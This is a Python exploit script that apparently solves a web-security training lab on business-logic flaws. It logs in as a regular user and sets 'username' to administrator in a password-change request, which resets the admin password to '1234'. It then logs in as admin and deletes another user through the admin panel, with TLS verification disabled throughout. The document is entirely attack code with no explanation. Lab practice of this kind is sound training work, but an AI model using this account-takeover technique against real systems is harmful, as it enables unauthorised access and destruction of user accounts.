from enum import Flag
import sys
import requests
from utils import get_csrf_token, login
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def change_password(session: requests.Session, url: str , data: dict):
    response = session.post(url, data=data , verify=False)
    if response.status_code != 200: 
        raise RuntimeError("Could not change the administrator password")

def delete_carlos(session: requests.Session, url: str):
    # 1) Login
    print("(+) Trying to logging...")
    login(session, f"{url}/login", username="wiener", password="peter")
    print("(+) Successfuly logging")

    # 2) Change passwod
    print("(+) Trying to change administrator password...")
    data = {"csrf": get_csrf_token(session, f"{url}/my-account"), 
            "username": "administrator",
            "new-password-1": "1234", 
            "new-password-2": "1234"}
    change_password(session, f"{url}/my-account/change-password",data)
    print("(+) Successfuly changed the password of the administrator.")

    #3) Logout from wiener user and logging as administrator
    print("(+) Trying to logout from wiener user...")
    response = session.get(f"{url}/logout", verify=False)
    if response.status_code != 200:
        raise RuntimeError("(-) Session expired")
    print("(+) Successfuly logged-out.")

    print("(+) Trying to logging as administrator...")
    login(session, f"{url}/login", username="administrator", password="1234")
    print("(+) Successfuly logging as administrator.")


    # 4) Delete carlos
    ## GET /admin/delete?username=wiener http/2.0
    print("(+) Trying to delete carlos...")
    response = session.get(f"{url}/admin/delete?username=carlos", verify=False)
    if response.status_code != 200:
        raise RuntimeError("(-) Could not delete carlos!")
    print("(+) Successfuly deleted.")

    if "Congratulations" in response.text:
        print("(+) Successfully exploited the business logic vulnerability.")
    else:
        print("(-) Could not exploit the business logic vulnerability.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage : {sys.argv[0]} <url>")
        sys.exit(-1)
    session = requests.Session()
    delete_carlos(session, sys.argv[1])


main()

